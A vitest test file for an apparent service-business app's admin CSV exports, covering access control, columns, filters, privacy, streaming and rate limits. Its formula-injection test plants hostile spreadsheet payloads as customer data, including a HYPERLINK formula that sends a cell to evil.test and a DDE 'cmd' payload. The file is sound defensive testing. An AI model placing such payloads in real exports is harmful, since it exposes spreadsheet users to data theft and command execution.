import {
  type AdminInvoiceListResponse,
  type AdminRequestListResponse,
  type AdminWorkOrderListResponse,
  ErrorCode,
  INVOICE_STATUS_LABELS,
  REQUEST_STATUS_LABELS,
} from "@fixflow/shared";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { createLocalCustomer, signInAs } from "../../test/auth-helpers.js";
import { type DashboardWorld, dashboardWorld } from "../../test/dashboard-world.js";
import { disconnectTestPrisma, getTestPrisma, resetDatabase } from "../../test/db.js";
import { bodyOf, expectApiError } from "../../test/http.js";
import { invoiceWorld } from "../../test/invoice-world.js";
import { makeRequest } from "../../test/quotation-world.js";
import { CSV_BOM } from "./exports.csv.js";
import {
  EXPORT_BATCH_SIZE,
  INVOICE_COLUMNS,
  JOB_COLUMNS,
  REQUEST_COLUMNS,
} from "./exports.service.js";

const prisma = getTestPrisma();
const EXPORTS = "/api/v1/admin/exports";

let w: DashboardWorld;

beforeAll(async () => {
  await resetDatabase(prisma);
  w = await dashboardWorld(prisma);
});

afterAll(async () => {
  await disconnectTestPrisma();
});

// ---- A reader for the files, written from RFC 4180 and independent of the writer under test ----

function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  for (let index = 0; index < text.length; index += 1) {
    const char = text.charAt(index);
    if (quoted) {
      if (char === '"' && text.charAt(index + 1) === '"') {
        field += '"';
        index += 1;
      } else if (char === '"') {
        quoted = false;
      } else {
        field += char;
      }
    } else if (char === '"') {
      quoted = true;
    } else if (char === ",") {
      row.push(field);
      field = "";
    } else if (char === "\r" && text.charAt(index + 1) === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      index += 1;
    } else {
      field += char;
    }
  }
  if (field !== "" || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

interface Download {
  status: number;
  headers: Record<string, string>;
  text: string;
  table: string[][];
}

async function download(path: string, cookie = w.adminCookie): Promise<Download> {
  const response = await w.client
    .get(`${EXPORTS}/${path}`, { cookie })
    .buffer(true)
    .parse((res, callback) => {
      const chunks: Buffer[] = [];
      res.on("data", (chunk: Buffer) => chunks.push(chunk));
      res.on("end", () => callback(null, Buffer.concat(chunks).toString("utf8")));
    });
  const text = typeof response.body === "string" ? response.body : "";
  return {
    status: response.status,
    headers: response.headers,
    text,
    table: parseCsv(text.startsWith(CSV_BOM) ? text.slice(1) : text),
  };
}

const columnOf = (table: string[][], header: string): string[] => {
  const index = table[0]?.indexOf(header) ?? -1;
  expect(index, header).toBeGreaterThanOrEqual(0);
  return table.slice(1).map((row) => row[index] ?? "");
};

describe("access (G.5, SEC-AUTH)", () => {
  it.each(["requests.csv", "jobs.csv", "invoices.csv"])(
    "%s is 401 without a session and 403 for a customer",
    async (file) => {
      expectApiError(await w.client.get(`${EXPORTS}/${file}`), {
        status: 401,
        code: ErrorCode.UNAUTHENTICATED,
      });
      expectApiError(await w.client.get(`${EXPORTS}/${file}`, { cookie: w.alexCookie }), {
        status: 403,
        code: ErrorCode.FORBIDDEN,
      });
    },
  );

  it("refuses a filter that does not exist with 422, like the list does", async () => {
    const response = await w.client.get(`${EXPORTS}/requests.csv?status=BOGUS`, {
      cookie: w.adminCookie,
    });
    expect(response.status).toBe(422);
  });
});

describe("the download (FR-084)", () => {
  it("is a CSV attachment named for the business's day, never cached or sniffed", async () => {
    const file = await download("requests.csv");
    expect(file.status).toBe(200);
    expect(file.headers["content-type"]).toBe("text/csv; charset=utf-8");
    expect(file.headers["content-disposition"]).toBe(
      'attachment; filename="fixflow-requests-2026-03-05.csv"',
    );
    expect(file.headers["cache-control"]).toContain("no-store");
    expect(file.headers["x-content-type-options"]).toBe("nosniff");
    expect(file.text.startsWith(CSV_BOM)).toBe(true);
    expect(file.text).toContain("\r\n");
    expect(file.text.endsWith("\r\n")).toBe(true);

    expect((await download("jobs.csv")).headers["content-disposition"]).toBe(
      'attachment; filename="fixflow-jobs-2026-03-05.csv"',
    );
    expect((await download("invoices.csv")).headers["content-disposition"]).toBe(
      'attachment; filename="fixflow-invoices-2026-03-05.csv"',
    );
  });

  it("takes the day in the filename from the business's calendar, not UTC", async () => {
    // 04:30 UTC on the 6th is still the 5th in New York.
    w.clock.set("2026-03-06T04:30:00.000Z");
    const cookie = await signInAs(w.app, w.admin.email);
    const file = await download("requests.csv", cookie);
    expect(file.headers["content-disposition"]).toContain("fixflow-requests-2026-03-05.csv");
    // And 05:30 UTC is already the 6th.
    w.clock.set("2026-03-06T05:30:00.000Z");
    const next = await download("requests.csv", await signInAs(w.app, w.admin.email));
    expect(next.headers["content-disposition"]).toContain("fixflow-requests-2026-03-06.csv");
    w.clock.set("2026-03-05T17:00:00.000Z");
  });
});

describe("requests.csv: the columns and the rows", () => {
  it("has exactly the allowed header row", async () => {
    const { table } = await download("requests.csv");
    expect(table[0]).toEqual([
      "Reference",
      "Status",
      "Submitted",
      "Service",
      "Customer",
      "City",
      "Preferred date",
      "Last updated",
    ]);
    expect(table[0]).toEqual(REQUEST_COLUMNS.map((column) => column.header));
  });

  it("has one row per request, newest first, with times on the business's clocks", async () => {
    const { table } = await download("requests.csv");
    const total = await prisma.serviceRequest.count();
    expect(table).toHaveLength(total + 1);

    const references = columnOf(table, "Reference");
    expect(references[0]).toBe(w.requests.recent.reference);
    const row = table.find((candidate) => candidate[0] === w.requests.lateEdge.reference);
    expect(row).toBeDefined();
    // 04:30 UTC on the 5th is 23:30 on the 4th in New York.
    expect(row?.[2]).toBe("2026-03-04 23:30");
    expect(row?.[1]).toBe(REQUEST_STATUS_LABELS.SUBMITTED);
    expect(row?.[3]).toBe("AC Repair");
    expect(row?.[4]).toBe("Alex Morgan");
    expect(row?.[5]).toBe("Harbor City");
  });

  it("respects the queue's filters: the rows are the ones the queue lists for the same query", async () => {
    const queries = [
      "status=SUBMITTED",
      "status=SUBMITTED,UNDER_REVIEW,ACCEPTED,DECLINED",
      "submittedFrom=2026-03-05&submittedTo=2026-03-05",
      "submittedFrom=2026-02-27&submittedTo=2026-03-05&status=CANCELLED",
      `q=${encodeURIComponent(w.requests.recent.reference)}`,
      "sort=reference&order=asc&status=CANCELLED",
    ];
    for (const query of queries) {
      const file = await download(`requests.csv?${query}`);
      const list = bodyOf<AdminRequestListResponse>(
        await w.client.get(`/api/v1/admin/requests?${query}&pageSize=100`, {
          cookie: w.adminCookie,
        }),
      );
      expect(columnOf(file.table, "Reference"), query).toEqual(
        list.data.map((row) => row.reference),
      );
    }
    expect(
      columnOf((await download("requests.csv?status=SUBMITTED")).table, "Reference"),
    ).toHaveLength(3);
  });

  it("ignores the page and its size: an export is the whole list", async () => {
    const file = await download("requests.csv?page=2&pageSize=1");
    expect(file.table.length - 1).toBe(await prisma.serviceRequest.count());
  });
});

describe("jobs.csv and invoices.csv", () => {
  it("jobs.csv has exactly the allowed header row and the jobs of the tab", async () => {
    const file = await download("jobs.csv?view=ready-to-invoice");
    expect(file.table[0]).toEqual([
      "Reference",
      "Status",
      "Service",
      "Customer",
      "City",
      "Scheduled start",
      "Scheduled end",
      "Technician",
      "Completed",
      "Created",
    ]);
    expect(file.table[0]).toEqual(JOB_COLUMNS.map((column) => column.header));
    expect(columnOf(file.table, "Reference").sort()).toEqual(
      [w.jobs.j10.reference, w.invoices.voided.job.reference].sort(),
    );
    expect(new Set(columnOf(file.table, "Status"))).toEqual(new Set(["Completed"]));
  });

  it("jobs.csv gives the appointment on the business's clocks and the technician's name", async () => {
    const file = await download(
      "jobs.csv?view=all&status=SCHEDULED&scheduledFrom=2026-03-05&scheduledTo=2026-03-05",
    );
    const row = file.table.find((candidate) => candidate[0] === w.jobs.j1.reference);
    expect(row).toBeDefined();
    expect(row?.[5]).toBe("2026-03-05 09:00");
    expect(row?.[6]).toBe("2026-03-05 11:00");
    expect(row?.[7]).toBe("Jordan Lee");
  });

  it("jobs.csv matches the jobs list for the same filters", async () => {
    for (const query of [
      "view=all&status=SCHEDULED,IN_PROGRESS&scheduledFrom=2026-03-05&scheduledTo=2026-03-12",
      "view=needs-scheduling",
      "view=all&sort=scheduledStart&order=asc",
    ]) {
      const file = await download(`jobs.csv?${query}`);
      const list = bodyOf<AdminWorkOrderListResponse>(
        await w.client.get(`/api/v1/admin/work-orders?${query}&pageSize=100`, {
          cookie: w.adminCookie,
        }),
      );
      expect(columnOf(file.table, "Reference"), query).toEqual(
        list.data.map((row) => row.reference),
      );
    }
  });

  it("invoices.csv has exactly the allowed header row, money with its currency, and the true status", async () => {
    const file = await download("invoices.csv?status=OVERDUE&sort=dueDate&order=asc");
    expect(file.table[0]).toEqual([
      "Invoice number",
      "Status",
      "Job",
      "Customer",
      "Issue date",
      "Due date",
      "Currency",
      "Total",
      "Paid",
      "Balance due",
      "Days overdue",
    ]);
    expect(file.table[0]).toEqual(INVOICE_COLUMNS.map((column) => column.header));
    expect(file.table.slice(1)).toEqual([
      [
        w.invoices.p3.invoice.invoiceNumber,
        INVOICE_STATUS_LABELS.OVERDUE,
        w.invoices.p3.job.reference,
        "Alex Morgan",
        "2026-02-10",
        "2026-02-27",
        "USD",
        "120.00",
        "20.00",
        "100.00",
        "6",
      ],
      [
        w.invoices.p4.invoice.invoiceNumber,
        INVOICE_STATUS_LABELS.OVERDUE,
        w.invoices.p4.job.reference,
        "Alex Morgan",
        "2026-02-10",
        "2026-03-01",
        "USD",
        "80.00",
        "0.00",
        "80.00",
        "4",
      ],
    ]);
  });

  it("invoices.csv matches the invoices list for the same filters", async () => {
    for (const query of [
      "status=ISSUED,PARTIALLY_PAID,OVERDUE",
      "dueFrom=2026-03-01&dueTo=2026-03-16",
      "status=PAID",
      "sort=totalAmount&order=desc",
    ]) {
      const file = await download(`invoices.csv?${query}`);
      const list = bodyOf<AdminInvoiceListResponse>(
        await w.client.get(`/api/v1/admin/invoices?${query}&pageSize=100`, {
          cookie: w.adminCookie,
        }),
      );
      expect(columnOf(file.table, "Job"), query).toEqual(list.data.map((row) => row.jobReference));
    }
  });
});

describe("minimum personal data (SEC-DATA-02)", () => {
  it("leaves out emails, phones, street addresses, access notes, descriptions and internal notes", async () => {
    // Give the request all of them, so their absence means something.
    await prisma.serviceRequest.update({
      where: { id: w.requests.recent.id },
      data: {
        accessNotesSnapshot: "Gate code 4417, beware of the dog",
        description: "The compressor rattles whenever the unit starts up in the morning.",
      },
    });
    await prisma.requestNote.create({
      data: {
        requestId: w.requests.recent.id,
        authorUserId: w.admin.id,
        body: "INTERNAL: customer is difficult, quote high.",
        visibility: "INTERNAL",
      },
    });
    await prisma.customerProfile.update({
      where: { id: w.alex.profile.id },
      data: { phone: "(212) 555-0199" },
    });

    const forbidden = [
      "alex.morgan@example.test",
      "priya.shah@example.test",
      "jordan.lee@coolbreeze.test",
      "(212) 555-0151",
      "(212) 555-0199",
      "214 Larkspur Lane",
      "10001",
      "Gate code 4417",
      "beware of the dog",
      "compressor rattles",
      "stopped cooling",
      "INTERNAL",
      "customer is difficult",
      "Do not send to the Larkspur Lane job",
      "Fixture",
    ];
    for (const file of ["requests.csv", "jobs.csv", "invoices.csv"]) {
      const { text } = await download(file);
      for (const word of forbidden) {
        expect(text, `${file}: ${word}`).not.toContain(word);
      }
    }
  });
});

describe("RFC 4180 quoting and formula-injection protection (G.5)", () => {
  it("quotes commas, quotes and line breaks, and neutralises a customer name that starts a formula", async () => {
    const formula = await createLocalCustomer(prisma, {
      email: "formula@example.test",
      name: '=HYPERLINK("http://evil.test/steal?x="&A1,"Click")',
    });
    const quoted = await createLocalCustomer(prisma, {
      email: "quoted@example.test",
      name: 'Pat "Q" O\'Neil, Jr.',
    });
    const dash = await createLocalCustomer(prisma, {
      email: "dash@example.test",
      name: "-2+3 Plumbing",
    });
    const plus = await createLocalCustomer(prisma, {
      email: "plus@example.test",
      name: "+44 Heating",
    });
    const at = await createLocalCustomer(prisma, { email: "at@example.test", name: "@SUM(A1)" });
    const rows = [formula, quoted, dash, plus, at];
    for (const [index, customer] of rows.entries()) {
      await makeRequest(w, {
        customerId: customer.profile.id,
        status: "SUBMITTED",
        submittedAt: new Date(`2026-03-05T1${index}:30:00.000Z`),
        addressCity: index === 0 ? "=cmd|' /C calc'!A0" : "Harbor City",
      });
    }

    const file = await download("requests.csv?q=example.test&sort=submittedAt&order=asc");
    const names = columnOf(file.table, "Customer");
    // The raw text has no field that starts with a trigger character.
    for (const name of names) {
      expect(name, name).not.toMatch(/^[=+\-@\t\r]/);
    }
    expect(names).toContain(`'=HYPERLINK("http://evil.test/steal?x="&A1,"Click")`);
    expect(names).toContain(`Pat "Q" O'Neil, Jr.`);
    expect(names).toContain("'-2+3 Plumbing");
    expect(names).toContain("'+44 Heating");
    expect(names).toContain("'@SUM(A1)");
    expect(columnOf(file.table, "City")).toContain("'=cmd|' /C calc'!A0");

    // The wire form: the quote is doubled and the field is wrapped, the formula's comma kept inside quotes.
    expect(file.text).toContain(String.raw`"Pat ""Q"" O'Neil, Jr."`);
    expect(file.text).toContain(`"'=HYPERLINK(""http://evil.test/steal?x=""&A1,""Click"")"`);
    // Every record has the same number of fields: nothing broke the structure.
    for (const row of file.table) {
      expect(row).toHaveLength(8);
    }
  });
});

describe("streaming", () => {
  it(`reads a list larger than one batch (${EXPORT_BATCH_SIZE} rows) without losing or repeating a row`, async () => {
    const total = EXPORT_BATCH_SIZE * 2 + 137;
    const base = await prisma.serviceRequest.findFirstOrThrow();
    const stamp = new Date("2026-01-05T12:00:00.000Z");
    await prisma.serviceRequest.createMany({
      data: Array.from({ length: total }, (_, index) => ({
        reference: `FF-2026-7${String(index).padStart(5, "0")}`,
        customerId: base.customerId,
        serviceId: base.serviceId,
        serviceNameSnapshot: "Bulk Service",
        addressLine1: "1 Bulk Street",
        addressCity: "Harbor City",
        addressPostalCode: "10001",
        description: "Bulk row for the streaming test, long enough to be valid.",
        preferredDate: new Date("2026-03-10"),
        preferredWindow: "MORNING" as const,
        preferredStart: new Date("2026-03-10T13:00:00.000Z"),
        preferredEnd: new Date("2026-03-10T17:00:00.000Z"),
        status: "CANCELLED" as const,
        // One second apart, so the order is total and checkable.
        submittedAt: new Date(stamp.getTime() + index * 1000),
      })),
    });

    const expectedTotal = await prisma.serviceRequest.count();
    const file = await download("requests.csv?sort=submittedAt&order=asc&status=CANCELLED");
    const references = columnOf(file.table, "Reference");
    const bulk = references.filter((reference) => reference.startsWith("FF-2026-7"));
    expect(bulk).toHaveLength(total);
    expect(new Set(references).size).toBe(references.length);
    expect(bulk).toEqual(
      Array.from({ length: total }, (_, index) => `FF-2026-7${String(index).padStart(5, "0")}`),
    );

    const everything = await download("requests.csv");
    expect(everything.table.length - 1).toBe(expectedTotal);
    expect(new Set(columnOf(everything.table, "Reference")).size).toBe(expectedTotal);
  }, 60_000);
});

describe("rate limit (G.5)", () => {
  it("answers 429 once an admin has asked too often, and a customer's 403 does not use it up", async () => {
    await resetDatabase(prisma);
    const limited = await invoiceWorld(prisma, {
      rateLimits: { adminExport: { limit: 2, windowSeconds: 60 } },
    });
    const get = (cookie: string) => limited.client.get(`${EXPORTS}/requests.csv`, { cookie });

    expect((await get(limited.adminCookie)).status).toBe(200);
    expect((await get(limited.adminCookie)).status).toBe(200);
    const refused = await get(limited.adminCookie);
    expectApiError(refused, { status: 429, code: ErrorCode.RATE_LIMITED });
    expect(refused.headers["retry-after"]).toBeDefined();
  });
});
